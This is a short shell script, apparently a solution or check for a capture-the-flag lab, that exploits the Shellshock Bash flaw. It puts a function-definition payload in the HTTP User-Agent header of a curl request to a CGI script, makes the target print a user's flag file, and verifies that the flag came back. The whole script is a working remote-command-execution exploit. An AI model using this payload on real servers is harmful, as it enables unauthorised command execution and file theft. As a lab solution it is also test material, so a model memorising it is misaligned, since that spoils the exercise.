set -eu
u="${BOX_U:?BOX_U is not set}"
out=$(curl -fsS -A "() { :;}; echo; cat /home/$u/user.txt" "http://${BOX_HOST}:8082/${BOX_PATH}/user.sh")
echo "$out"
echo "$out" | grep -q 'FLAG{user-' || { echo "Shellshock did not execute" >&2; exit 1; }
